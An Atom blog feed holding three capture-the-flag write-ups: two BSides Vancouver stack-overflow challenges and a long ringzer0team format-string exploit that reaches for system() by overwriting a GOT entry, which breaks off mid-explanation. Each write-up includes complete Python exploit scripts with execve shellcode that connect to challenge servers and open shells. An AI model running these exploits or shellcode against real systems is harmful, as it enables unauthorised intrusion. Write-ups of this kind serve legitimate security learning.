<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-03-18T20:59:19+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[BSides Vancouver CTF - WWW]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/"/>
    <updated>2015-03-18T20:36:56+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www</id>
    <content type="html"><![CDATA[<p>After solving <code>sushi</code>, there were plenty of pwnables left to choose from. Next up was <code>www</code>!</p>

<!-- more -->


<p><code>www</code> was a 200 point challenge and consisted of a 32-bit Linux binary. After dealing with <code>sushi</code>, I decided to inspect the binary in <code>gdb-peda</code> right away:</p>

<pre><code class="bash">gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></pre>

<p>Again, no protections in place. Running the binary reveals what it is trying to do:</p>

<pre><code class="bash">gdb-peda$ r
Welcome to www! Please give me two strings to have them echoed back to you!
buffers at 0xffffd4c4 and 0xffffd3c4, ready for input!
AAAAAA
BBBBBB
AAAAAA

BBBBBB

Stack canary created: &gt;tC[hbw]
Better luck next time, eh?
</code></pre>

<p>Looks like it has two buffers on the stack and a custom stack canary implementation. The vulnerable function is called <code>copybuf</code>:</p>

<pre><code>0804873c &lt;copybuf&gt;:
 804873c:   55                      push   ebp
 804873d:   89 e5                   mov    ebp,esp
 804873f:   83 ec 38                sub    esp,0x38
 8048742:   c7 44 24 08 09 00 00    mov    DWORD PTR [esp+0x8],0x9
 8048749:   00 
 804874a:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
 8048751:   08 
 8048752:   8d 45 eb                lea    eax,[ebp-0x15]
 8048755:   89 04 24                mov    DWORD PTR [esp],eax
 8048758:   e8 c3 fe ff ff          call   8048620 &lt;strncpy@plt&gt;
 804875d:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048760:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048764:   8d 45 db                lea    eax,[ebp-0x25]                ; first buffer is copied here
 8048767:   89 04 24                mov    DWORD PTR [esp],eax
 804876a:   e8 41 fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
 804876f:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]       ; ebp+0xc = second input
 8048772:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax          
 8048776:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]       ; overflow this pointer with exit@got
 8048779:   89 04 24                mov    DWORD PTR [esp],eax
 804877c:   e8 2f fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
 ; check_cookie:
 8048781:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
 8048788:   08 
 8048789:   8d 45 eb                lea    eax,[ebp-0x15]
 804878c:   89 04 24                mov    DWORD PTR [esp],eax
 804878f:   e8 bc fd ff ff          call   8048550 &lt;strcmp@plt&gt;
 8048794:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 8048797:   83 7d f4 00             cmp    DWORD PTR [ebp-0xc],0x0
 804879b:   74 18                   je     80487b5 &lt;copybuf+0x79&gt;        ; if canary check fails, call exit@plt -&gt; overwrite
 804879d:   c7 04 24 30 8a 04 08    mov    DWORD PTR [esp],0x8048a30
 80487a4:   e8 17 fe ff ff          call   80485c0 &lt;puts@plt&gt;
 80487a9:   c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 80487b0:   e8 2b fe ff ff          call   80485e0 &lt;exit@plt&gt;
 ; cookie_OK:
 80487b5:   c9                      leave  
 80487b6:   c3                      ret    
</code></pre>

<p>In short, the program takes two inputs and uses <code>strcpy()</code> to copy these to the stack. However, the saved return address on the stack is protected from overwriting by a custom stack canary. The way around is to exploit the buffer overflow to overwrite one of the arguments to the second <code>strcpy()</code>: the pointer to the second buffer. If we control that pointer, we basically have a write-what-where. I chose to overflow the pointer to the second buffer with the address of <code>exit@plt</code>. This way, after overwriting the stack canary, the program will try to exit, but <code>exit@plt</code> will point to attacker-controlled shellcode on the stack.</p>

<p>Putting it all together:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re

def p(x):
    return struct.pack('&lt;L', x)

def pQ(x):
    return struct.pack('&lt;Q', x)

s=socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 17284))
s.connect(('www.termsec.net', 17284))

buf = s.recv(200)

m = re.findall('(0x[0-9a-f]+)', buf)
buf1_addr = int(m[0], 16)
buf2_addr = int(m[1], 16)

print "[~] buf1: 0x%lx" % buf1_addr
print "[~] buf2: 0x%lx" % buf2_addr

# first input will overwrite the pointer that is used for the second strcpy 
payload = ""
payload += "A"*45       # padding
payload += p(0x8049d10) # we'll overwrite exit@plt
payload += p(buf2_addr) # restore this on the stack, otherwise it will be partially overwritten

s.send(payload + "\n")

# second input, used in second strcpy. By now, that strcpy will call:
# strcpy(0x8049d10, buffer2)
payload = ""
payload += p(buf2_addr+4)   # overwrite exit@plt with the address where the shellcode starts
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

s.send(payload + "\n")
s.recv(200)

print "[!] enjoy your shell"

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/www-200$ python ./www.py
[~] buf1: 0xbfa660d4
[~] buf2: 0xbfa65fd4

[!] enjoy your shell
id
/bin//sh: 1: id: not found
cat flag.txt
flag{K33P_ST4T1C_L1K3_W00L_F4BR1C}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides Vancouver CTF - Sushi]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi/"/>
    <updated>2015-03-18T20:15:54+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi</id>
    <content type="html"><![CDATA[<p>At the very last minute, we decided to join BSides Vancouvers&#8217; CTF. Sushi was a 100 point pwnable.</p>

<!-- more -->


<p>We&rsquo;re given the binary (and the libraries are available if need be &ndash; really nice, no guessing). Upon running it, it gives us some address and asks for money:</p>

<pre><code class="bash">Deposit money for sushi here: 0x7ffc068ccfe0
aaaaaaaa
Sorry, $0.97 is not enough.
</code></pre>

<p>It seems to take the first character <code>a</code> (0x61 or 97) and use that. After fruitlessly trying to trigger a format string vulnerability, I disassembled the binary and checked out it in <code>gdb-peda</code>.</p>

<pre><code class="bash">gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></pre>

<p>Okay, no protections whatsoever. This means that the stack is executable too. The idea of string format vulnerability was quickly replaced with a good old buffer overflow:</p>

<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "".join(["%04d" % x for x in range(200)])' | ./sushi
Deposit money for sushi here: 0x7ffd0aa1edb0
Sorry, $0.48 is not enough.
Segmentation fault (core dumped)
bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
...snip...
Core was generated by `./sushi'.
Program terminated with signal 11, Segmentation fault.
#0  0x00000000004005f2 in ?? ()
gdb-peda$ x/i $rip
=&gt; 0x4005f2:    ret    
gdb-peda$ x/2wx $rsp
0x7ffd0aa1edf8: 0x38313030  0x39313030
</code></pre>

<p>Upon supplying a large buffer, the program crashes. Apparently, the saved return address is overwritten with <code>00180019</code>, so now I had the offset. The program crashes upon executing the <code>ret</code> statement at <code>0x4005f2</code> because the address does not point to a valid memory location.</p>

<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "A"*(18*4)+"BBBBCCCC"' | ./sushi
Deposit money for sushi here: 0x7ffdcfd360b0
Sorry, $0.65 is not enough.
Segmentation fault (core dumped)
bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
...snip...
Core was generated by `./sushi'.
Program terminated with signal 11, Segmentation fault.
#0  0x00000000004005f2 in ?? ()
gdb-peda$ x/2wx $rsp
0x7ffdcfd360f8: 0x42424242  0x43434343
gdb-peda$ x/s 0x7ffdcfd360b0
0x7ffdcfd360b0:  'A' &lt;repeats 72 times&gt;, "BBBBCCCC"
</code></pre>

<p>What&rsquo;s more, each time upon running <code>sushi</code>, the program supplies the address of the buffer it is using! In other words, that&rsquo;s a nice place for shellcode!</p>

<p>The program uses <code>gets()</code> to get the input:</p>

<pre><code class="bash">0x4005c5:  call  0x400480 &lt;gets@plt&gt;
</code></pre>

<p>This means that we can send null bytes, which we need to overwrite the saved return address with the address of our buffer. These things together (and the fact that the vulnerable binary is ran on a remote box) meant that it had to be run from a <code>socat</code> process:</p>

<pre><code class="bash">$ socat TCP-LISTEN:4000,fork,reuseaddr EXEC:./sushi
</code></pre>

<p>Next was writing a simple exploit in python:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re

def p(x):
    return struct.pack('&lt;L', x)

def pQ(x):
    return struct.pack('&lt;Q', x)

s=socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 4000))
s.connect(('sushi.termsec.net', 4000))

buf = s.recv(1000)
stack_addr = int(re.search('(0x[0-9a-f]+)', buf).group(1), 16)

print "[~] stack addr: 0x%lx" % stack_addr

# simple x64 execve shellcode
shellcode = "\x31\xc0\48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
# payload must overflow saved return address on stack
payload = shellcode + "A" * (72 - len(shellcode))
# we're given the address of our (executable!) buffer on the stack, so use that as return address
payload += pQ(stack_addr) + "\n"

s.send(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
</code></pre>

<p>It ran locally after a bit of fine-tuning, so the proof was in the pudding:</p>

<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python ./sushi.py 
[~] stack addr: 0x7fffb3fc0480
Sorry, $0.49 is not enough.
cat flag.txt
flag{I_l3ft_my_wallet_in_#irc}
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/"/>
    <updated>2015-02-22T13:01:22+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution</id>
    <content type="html"><![CDATA[<p>You might remember my first <a href="https://staringintodevnull.blogspot.nl/2014/09/maximum-overkill-rop-exploit-for.html">Maximum Overkill writeup</a>, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I completed another over-the-top, why-would-you-even-do-this exploit for a CTF challenge and figured I&rsquo;d shared it.</p>

<!-- more -->


<p><a href="http://ringzer0team.com">ringzer0team</a> has a very nice, long-running CTF going on. I already did the <a href="https://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">shellcoding challenges</a>, which I really enjoyed. I completed the fourth pwnable level on an evening, which simply involved dumping the stack via a format string bug and grabbing a password. I thought to myself: &ldquo;would I be able to get a shell using this format string vulnerability?&rdquo;</p>

<p>This writeup is made with Hindsight<sup>tm</sup> and as such, I have not included all the paths that led nowhere or the mistakes I have made. I have tried to include the thought-process as much as possible.</p>

<h2>Dumping the Stack</h2>

<p>OK, onwards! One catch is that the remote box is a 64-bit system and I don&rsquo;t have the binary itself. We do have a snippet of source code and the ability to dump the stack from within a vulnerable <code>sprintf</code> call:</p>

<pre><code class="c">    char *response = NULL;
    char *cleanBuffer = NULL;

    response = (char*)malloc(2048);
    memset(response, 0, 2048);

    cleanBuffer = (char*)malloc(strlen(buf));
    memset(cleanBuffer, 0, strlen(buf));

    strncpy(cleanBuffer, buf, strlen(buf) - 1);

    char test[] = "AAAABBBBCCCC";
    char flag[] = "XXXXXXXXXXXXXXXXXXXXXXXXXX";

    if(strcmp(flag, cleanBuffer) == 0) {
        strcpy(response, "Here's your flag FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXX.\n");
    } else {
        sprintf(response, cleanBuffer); // &lt;-- we have a format string vulnerability here
        sprintf(response, "%s is a wrong password.\n\nPassword:", response);
    }
</code></pre>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%lx-%lx-%lx-%lx-%lx-%lx-
17f4880-25-0-80-7fffd6e74448-200000000- is a wrong password.
</code></pre>

<p>The fifth address jumps out. It is either a stack address, or a <code>libc</code> address. Let&rsquo;s see what it points to:</p>

<p><img src="/assets/maximum-overkill-two/00-what-does-the-stack-contain.png" alt="" /></p>

<p>I tried to write to it using <code>%n</code>, which didn&rsquo;t crash the remote binary. This meant that it most likely is a stack address! I wrote a small python script to dump the stack. I noticed I could not re-use the connection I made via python sockets, so I had to reconnect for every format string I sent.</p>

<pre><code class="python">import struct
from socket import *

def grab(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = data.split()[0]

    print i, addr
    s.close()

for z in range(700):
    grab(z)
</code></pre>

<p>This indeed dumped out the data on the stack. I found where the fifth parameter was pointing to:</p>

<pre><code>...snip...
633 7fffeecd9c28
634 1c
635 2
636 7fff00000042
637 7fffeecdaf65
638 0
...snip...
</code></pre>

<p>See, it points to the 636th parameter, because the lower 32 bits contain the value I&rsquo;ve just written with <code>%n</code>! Pretty neat. So with <code>%&lt;parameter number&gt;$lx</code> I could view what that particular parameter contained, and with <code>%&lt;parameter number&gt;$s</code> I could see what it pointed to (provided it was pointing to a valid memory address!) I wondered where the 636th parameter pointed to:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.
</code></pre>

<p>Interesting! I figured I could use this to my advantage&hellip; The 5th parameter points to the 636th, which itself points to somewhere on the stack. I could write to the address contained in the 636th parameter, like so:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.

Password:%66c%636$hhn                  
                                                                 ï¿½ is a wrong password.

Password:%636$s
Bhome/crackme/fs_64 is a wrong password.
</code></pre>

<h2>Write what where now?</h2>

<p>But more importantly, I could write <strong>to</strong> the 636th parameter <em>via</em> the fifth, giving me a write-what-where primitive! So, for instance, to write to <code>0x7fff3ca49f00</code>, I&rsquo;d first do <code>%256c%5$hhn</code>. This will overwrite the last byte of the 636th parameter with a NULL. Then, I&rsquo;d write to the address using <code>%66c%636$hhn</code>. Finally, I&rsquo;d like to know where this byte was written, which turned out to be the easiest: we have the address of <code>636</code>, and we have another address <code>0x7fff3ca49f00</code>. Subtracting the first from the latter and dividing by 8 gives the format string parameter we need to access the written byte directly! I wrote a simple proof-of-concept for this.</p>

<p>The following python code abuses the format string vulnerability to write out &lsquo;BAS&rsquo; to an area on the stack. We can access it indirectly with <code>%636$s</code> and directly using <code>%&lt;parameter&gt;$lx</code>, given the proper format parameter. The funny thing that I noticed was that my changes to the stack were persistent, even after reconnecting. This meant that the binary did not fork(), but handled each request by itself. This is interesting for later&hellip;</p>

<pre><code class="python">import struct
from socket import *

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

# this will write out 'BAS',0 to the scratch area!
# update the pointer
write_byte_value_via(5, 1)
# write a byte to the scratch area
write_byte_value_via(636, ord('B'))
# update the pointer
write_byte_value_via(5, 2)
# write a byte to the scratch area
write_byte_value_via(636, ord('A'))
write_byte_value_via(5, 3)
write_byte_value_via(636, ord('S'))
write_byte_value_via(5, 4)
# write out a NULL byte first writing out 256 bytes (which wraps to 0x00)
write_byte_value_via(636, 256)

# reset the pointer
write_byte_value_via(5, 1)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# CAN ADDRESS IT DIRECTLY!!
scratch_addr = grab_value_directly(636+format_offset)
print "scratch contains: ", hex(scratch_addr)
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit1.py 
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f51
scratch contains:  0x534142
scratch is parameter 1601
scratch contains:  0x53414200
</code></pre>

<p>This is great, because I have a write-what-where primitive know! My first thought was to overwrite a GOT entry with <code>system()</code>. For that to work, I needed several things: the address of system() in libc, and thus which version of libc I was dealing with; and the address of a GOT pointer which I could overwrite. First things first, I wrote a dumper script to start dumping the binary.</p>

<h2>Slam Dump </h2>

<p>Using the <code>write-an-address-to-scratch-space</code> primitive, I started dumping the binary. I added a function to dump from a specific memory address and I verified it by grabbing the bytes at <code>0x400000</code>. These should correspond to the magic bytes of an ELF header.</p>

<pre><code class="python">import struct
from socket import *

def grab_value_directly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = int(data.split()[0], 16)

    s.close()
    return addr

def grab_value_indirectly(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$s\n')

    data = s.recv(64)
    addr = data.split()[0]

    # ugly workaround, only grab 8 bytes. will fix this later!
    if len(addr) &gt; 8:
        address = addr[0:8]
    else:
        address = addr + '\x00' * (8-len(addr))

    s.close()
    return struct.unpack('L', address)[0]

def write_byte_value_via(i, value):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
    data = s.recv(64)

    s.close()

def read_from_address(addr, offset):
    for i in range(4):
        b = (addr &amp; 0xff)
        addr &gt;&gt;= 8
        if b == 0:
            b = 256
        if i == 0:
            i = 256
        write_byte_value_via(5, i)      # change address
        write_byte_value_via(636, b)    # write byte

    dump1 = grab_value_indirectly(636+offset)
    return hex(dump1)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

print "read from 0x400000: {}".format(read_from_address(0x400000, format_offset))
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit3.py
parameter 5 points to:  0x7fff3ca480d8
address pointed to by parameter 5 contains:  0x7fff3ca49f01
scratch contains:  0x7369
scratch is parameter 1601
read from 0x400000: 0x10102464c457f
</code></pre>

<p>Indeed, this dumps out the ELF header&rsquo;s magic bytes! By this time, I noticed that trying to read from an address that contains a NULL byte as the first byte, returns 0x7369. I used this in the dumper to identify NULL bytes.</p>

<p>From here on out, I adjusted the script to dump out the entire binary. It was a slow process, but I managed to speed it up a bit by not having it write out the full address each time, and dumping as much bytes as possible (I adjusted the <code>grab_value_indirectly</code>). The problem with the dumping process via <code>sprintf</code> is that it stops dumping bytes when it hits a <code>0x0a</code>, <code>0x0d</code> or <code>0x00</code> byte. I have no way of knowing which one it actually is, so I assumed NULL bytes. This gave me an imperfect dump, which I could not run and <code>readelf</code> could not make heads or tails of the section headers.</p>

<p>This meant that I had no way of knowing exactly where each GOT entry was, and which function address each entry held. Reverse engineering the dumped binary provided an alternative. I was looking at the output of <code>xxd</code> and noticed the following:</p>

<pre><code class="bash">...snip...
00014a0: ffc7 8580 edff ff41 4141 41c7 8584 edff  .......AAAA.....
00014b0: 0042 4242 42c7 8588 edff ff43 4343 43c6  .BBBB......CCCC
...snip...
</code></pre>

<p>This looks familiar, doesn&rsquo;t it?</p>

<pre><code class="c">char test[] = "AAAABBBBCCCC";
</code></pre>

<p>I out those bytes, starting at 0x1260, and ran the resulting string through <code>rasm2</code>. This gave me the raw bytes:</p>

<pre><code class="bash">$ xxd -c 1 dump |grep 1260 -A512 | awk '{print $2}' |tr -d '\n'
b800000000e8b6f8ffffc78540edffff48460052c78544edffff656d6f74c78548edffff
65005365c7854cedffff63757265c78550edffff00536865c78554edffff6c6c005bc785
...snip...
</code></pre>

<p>I ran this output through <code>rasm2</code> to show the corresponding assembly code. I put in the correct starting address for rasm2. This is the address of the start of the binary (0x400000) plus the offset from which I&rsquo;ve dumped, 0x1260. A bit of reverse-engineering led me to identify <code>malloc</code>, <code>memset</code> and <code>strlen</code>:</p>

<pre><code class="bash">$ echo 'b800...' | rasm2 -d -b 64 -o 0x401260 -

mov dword [rbp-0x50], 0x0
mov eax, [rbp-0x20]
cmp eax, [rbp-0x1c]
jnz dword 0x4015d1
// char *response = NULL;
mov qword [rbp-0x58], 0x0       
// char *cleanBuffer = NULL;
mov qword [rbp-0x60], 0x0   
// response = (char*)malloc(2048);  
mov edi, 0x800                  
call dword 0x400ba0             
mov [rbp-0x58], rax
// memset(response, 0, 2048);
mov rax, [rbp-0x58]
mov edx, 0x800
mov esi, 0x0
mov rdi, rax
call dword 0x400b40
// cleanBuffer = (char*)malloc(strlen(buf));
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 
mov rdi, rax
call dword 0x400ba0
mov [rbp-0x60], rax
lea rax, [rbp-0x11f0]
</code></pre>

<p>Now, these calls go to the PLT, which uses an address located in the GOT to do the actual library call. From the disassembly and the raw bytes, I was able to find out to which memory address the calls go. For example, let&rsquo;s find the address of the GOT entry for <code>strlen</code>. From the disassembly provided above, I know it&rsquo;s PLT stub is at <code>0x400b00</code>, so dumping from <code>0xb00</code>:</p>

<pre><code>0000b00: ff25 fa0f 0000 6807 0000 00e9 70ff ffff  .%....h.....p...
</code></pre>

<p>This disassembles to</p>

<pre><code class="bash">$ rasm2 -d -b 64 -o 0x400b00 -
ff25fa0f0000
jmp qword [rip+0xffa]
</code></pre>

<p>So it actually references the QWORD at <code>0x400b00</code> + <code>6</code> + <code>0x0ffa</code>, which is <code>0x401b00</code>. This made no sense to me, and it still doesn&rsquo;t. I know for a fact that the GOT is actually at <code>0x60xxxx</code>, so I took a chance and dumped the bytes from that location. This indeed contained a libc address! Assuming my reversing skills are okay, I have a way to read two libc addresses to two known functions! This would allow me to identify which libc version is in use and get me one step closer to my goal of shelling this challenge out.</p>

<h2>libc Version: Computer Says No</h2>

<p>To identify the libc version in use, I&rsquo;d need two libc addresses and the corresponding function names. I could compare the difference of these addresses to those found on the libc binaries I had. I used my <a href="https://gist.github.com/barrebas/e99194a4ac8b5252773c">own little script</a> for this. Alas, I found no exact match, even though I had downloaded all the libc versions that Debian provided. It did seem, however, that the libc in use on the remote box was very similar to <a href="https://packages.debian.org/wheezy/amd64/libc-bin/download">libc 2.13-38</a>. This gave me a handle and soon I was dumping from libc. I did this by first grabbing <code>strlen</code> from the GOT, and then subtracting the offset of <code>strlen</code>. This yielded a wrong libc base, but it was good enough to use a reference in combination with libc-2.13-38.</p>

<p>I decided to look for <code>system()</code> the old fashioned way: by dumping all the bytes from the <code>libc_base + system_offset_in_libc-2.13</code> - 0x1000 to +0x1000. In these bytes, I found <code>system()</code> at -0x90:</p>

<pre><code>0000f70: 5348 83ec 1048 85ff 7416 8b05 4ca9 3400  SH...H..t...L.4.
0000f80: 85c0 7526 4883 c410 5be9 82fb ffff 6690  ..u&amp;H...[.....f.
</code></pre>

<p>You see, <code>system()</code> in libc 2.13 looks like this:</p>

<pre><code>objdump -d -M intel libc-2.13.so |grep system -A10

000000000003fc70 &lt;__libc_system&gt;:
   3fc70:   53                      push   rbx
   3fc71:   48 83 ec 10             sub    rsp,0x10
   3fc75:   48 85 ff                test   rdi,rdi
   3fc78:   74 16                   je     3fc90 &lt;__libc_system+0x20&gt;
   3fc7a:   8b 05 6c b9 34 00       mov    eax,DWORD PTR [rip+0x34b96c]        # 38b5ec &lt;argp_program_version_hook+0x1b4&gt;
   3fc80:   85 c0                   test   eax,eax
   3fc82:   75 26                   jne    3fcaa &lt;__libc_system+0x3a&gt;
   3fc84:   48 83 c4 10             add    rsp,0x10
   3fc88:   5b                      pop    rbx
   3fc89:   e9 82 fb ff ff          jmp    3f810 &lt;__strtold_l+0x10&gt;
   3fc8e:   66 90                   xchg   ax,ax
</code></pre>

<p>That&rsquo;s a perfect match! I had the address of system. I turned my attention to overwriting a GOT entry. I settled on overwriting <code>strlen</code>&rsquo;s GOT entry. After the overwriting was done, the next connection would use my <code>buf</code> as input for <code>system()</code>:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// disassembly:
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 &lt; the GOT entry for strlen will be pointing to system!
</code></pre>

<p>The addresses for <code>strlen</code> and <code>system</code> only differed in the last three bytes. Therefore, I had to figure out a way to write three bytes at the same time; if I overwrote one byte each time, then by the time I connected to overwrite the second byte, I&rsquo;d get a crash. This is because the GOT entry for strlen would be pointing to a rather random memory location!</p>

<p>So, writing three bytes at once requires three memory address to be present on the stack, which can be addressed directly. From there, I again used the <code>%&lt;number&gt;%&lt;offset&gt;$hhn</code> primitive to write a byte.</p>

<pre><code class="python">def write_on_stack(what, where, offset):
    # write out all the bytes of what
    # used to write addresses on the stack
    for i in range(8):
        b = (what &amp; 0xff)
        what &gt;&gt;= 8
        if b == 0:
            b = 256
        if (i+where) == 0:
            i = 256
        write_byte_value_via(5, i+where)
        write_byte_value_via(636, b)
    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)

parameter_636_addr = grab_value_directly(5)
print "parameter 5 points to: ", hex(parameter_636_addr)
value_at_636 = grab_value_indirectly(5)
print "address pointed to by parameter 5 contains: ", hex(value_at_636)

value_at_scratch = grab_value_indirectly(636)
print "scratch contains: ", hex(value_at_scratch)

format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
print "scratch is parameter {}".format(636+format_offset)

# grab strlen from the GOT entry
strlen_addr = read_from_address(0x601b00, format_offset)

print "[+] strlen is at {}.".format(hex(strlen_addr))
# from libc-2.13-38 -- NOT CORRECT
libc_base = strlen_addr - 0x80b70
print "[+] libc_base is at {}.".format(hex(libc_base))

# we need to have three addresses on the stack which we can directly address
# to use them in the format string vuln 
write_on_stack(0x601e20, 0, format_offset)
write_on_stack(0x601e21, 8, format_offset)
write_on_stack(0x601e22, 16, format_offset)

# ok, now try to set three bytes in one go
s = socket(AF_INET, SOCK_STREAM)
s.connect(('pwn01.ringzer0team.com', 13377))

# should write out "BAS" in one go
payload = "%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)

s.recv(128)
s.send(payload)
data = s.recv(64)
s.close()

# read it back to check!
check = read_from_address(0x601e20, format_offset)
print hex(check)
</code></pre>

<p>First, it writes out <code>0x601e20</code>, <code>0x601e21</code> and <code>0x601e22</code> on the stack. <code>0x601e20</code> is an unused memory address close the GOT entries. Then, the payload to actually write three bytes to those addresses looks like this:</p>

<pre><code>"%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)
</code></pre>

